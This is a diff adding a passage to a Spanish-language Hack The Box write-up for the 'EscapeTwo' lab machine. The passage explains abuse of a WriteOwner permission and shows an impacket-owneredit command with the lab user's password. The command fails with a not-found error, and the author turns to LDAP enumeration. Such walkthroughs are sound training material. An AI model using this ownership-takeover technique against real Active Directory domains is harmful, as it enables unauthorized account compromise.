@@ -668,3 +668,50 @@ Después de cargar los datos en bloodound busque los usuarios que comprometí ha
 ![](/assets/images/htb-writeup-EscapeTwo/blood.png)
 
 Lo mas interesante es que el usuario ryan tiene el permiso WriteOwner sobre el usuario ca_svc. Cuando un usuario tiene el permiso **Write Owner**  sobre otro usuario le permite otorgar la propiedad, luego asignar el control total y , finalmente, realizar ataques como kerberoasting o un cambio de contraseña sin conocer las credenciales de la victima.
+
+Como primer paso para su explotación otorge la propiedad:
+
+```bash
+impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=ca_svc,CN=Users,DC=sequel,DC=htb' sequel.htb/ryan:'WqSZAF6CysDQbGb3'  -dc-ip 10.10.11.51
+
+/usr/share/doc/python3-impacket/examples/owneredit.py:87: SyntaxWarning: invalid escape sequence '\V'
+  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
+/usr/share/doc/python3-impacket/examples/owneredit.py:96: SyntaxWarning: invalid escape sequence '\P'
+  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
+/usr/share/doc/python3-impacket/examples/owneredit.py:97: SyntaxWarning: invalid escape sequence '\R'
+  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
+/usr/share/doc/python3-impacket/examples/owneredit.py:98: SyntaxWarning: invalid escape sequence '\I'
+  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
+/usr/share/doc/python3-impacket/examples/owneredit.py:100: SyntaxWarning: invalid escape sequence '\P'
+  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
+/usr/share/doc/python3-impacket/examples/owneredit.py:101: SyntaxWarning: invalid escape sequence '\P'
+  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
+/usr/share/doc/python3-impacket/examples/owneredit.py:102: SyntaxWarning: invalid escape sequence '\W'
+  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
+/usr/share/doc/python3-impacket/examples/owneredit.py:103: SyntaxWarning: invalid escape sequence '\T'
+  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
+/usr/share/doc/python3-impacket/examples/owneredit.py:104: SyntaxWarning: invalid escape sequence '\D'
+  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
+/usr/share/doc/python3-impacket/examples/owneredit.py:105: SyntaxWarning: invalid escape sequence '\C'
+  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
+/usr/share/doc/python3-impacket/examples/owneredit.py:106: SyntaxWarning: invalid escape sequence '\E'
+  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
+/usr/share/doc/python3-impacket/examples/owneredit.py:107: SyntaxWarning: invalid escape sequence '\C'
+  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
+/usr/share/doc/python3-impacket/examples/owneredit.py:108: SyntaxWarning: invalid escape sequence '\R'
+  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
+/usr/share/doc/python3-impacket/examples/owneredit.py:109: SyntaxWarning: invalid escape sequence '\R'
+  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
+/usr/share/doc/python3-impacket/examples/owneredit.py:110: SyntaxWarning: invalid escape sequence '\R'
+  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
+/usr/share/doc/python3-impacket/examples/owneredit.py:111: SyntaxWarning: invalid escape sequence '\H'
+  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
+/usr/share/doc/python3-impacket/examples/owneredit.py:112: SyntaxWarning: invalid escape sequence '\A'
+  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
+/usr/share/doc/python3-impacket/examples/owneredit.py:113: SyntaxWarning: invalid escape sequence '\R'
+  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] Target principal not found in LDAP (CN=ca_svc,CN=Users,DC=sequel,DC=htb)
+```
+Mi comando anterior obtuvo un error indicando que no podía encontrar a **ca_svc** en LDAP así que enumeré los usuarios con ldapsearch para saber el Distinguished Name (DN) correcto
